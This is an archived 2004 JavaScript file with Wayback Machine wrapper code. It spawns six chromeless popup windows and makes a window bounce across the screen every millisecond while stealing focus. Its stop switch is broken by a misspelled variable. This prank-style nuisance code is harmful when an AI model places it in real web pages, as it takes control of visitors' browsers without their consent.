var _____WB$wombat$assign$function_____ = function(name) {return (self._wb_wombat && self._wb_wombat.local_init && self._wb_wombat.local_init(name)) || self[name]; };
if (!self.__WB_pmw) { self.__WB_pmw = function(obj) { this.__WB_source = obj; return this; } }
{
  let window = _____WB$wombat$assign$function_____("window");
  let self = _____WB$wombat$assign$function_____("self");
  let document = _____WB$wombat$assign$function_____("document");
  let location = _____WB$wombat$assign$function_____("location");
  let top = _____WB$wombat$assign$function_____("top");
  let parent = _____WB$wombat$assign$function_____("parent");
  let frames = _____WB$wombat$assign$function_____("frames");
  let opener = _____WB$wombat$assign$function_____("opener");



		var xOff = 5;
		var yOff = 5;
		var xPos = 400;
		var yPos = -100;
		var flagRun = 1;

function openWindow(url){
        aWindow = window.open(url,"_blank", 'menubar=no,status=no,toolbar=noresizable=no,width=180,height=175,titlebar=no,alwaysRaised=yes');
}

function procreate(){
		openWindow('open.html');
		openWindow('open.html');
		openWindow('open.html');
		openWindow('open.html');
		openWindow('open.html');
		openWindow('open.html');
		}

function newXlt(){
        xOff = Math.ceil( 0 - 6 * Math.random()) * 5 - 10 ;
        window.focus()}

function newXrt(){
        xOff = Math.ceil(7 * Math.random())  * 5 - 10 ;
        }

function newYup(){
        yOff = Math.ceil( 0 - 6 * Math.random())  * 5 - 10 ;
        }

function newYdn(){
        yOff = Math.ceil( 7 * Math.random())  * 5 - 10  ;
        }
function fOff(){
        flagrun = 0;
        }

function playBall(){
        xPos += xOff;
        yPos += yOff;
        if (xPos > screen.width-175){
        newXlt();
        }
        if (xPos < 0){
        newXrt();
        }
        if (yPos > screen.height-100){
        newYup();
        }
        if (yPos < 0){
        newYdn();
        }
        if (flagRun == 1){
        window.moveTo(xPos,yPos);
        setTimeout('playBall()',1);
        }
        }


}
/*
     FILE ARCHIVED ON 05:15:49 Oct 19, 2004 AND RETRIEVED FROM THE
     INTERNET ARCHIVE ON 04:56:46 Dec 16, 2023.
     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.

     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
     SECTION 108(a)(3)).
*/
/*
playback timings (ms):
  captures_list: 87.044
  exclusion.robots: 0.122
  exclusion.robots.policy: 0.106
  cdx.remote: 0.088
  esindex: 0.011
  LoadShardBlock: 47.709 (3)
  PetaboxLoader3.datanode: 68.501 (4)
  load_resource: 61.187
  PetaboxLoader3.resolve: 27.37
*/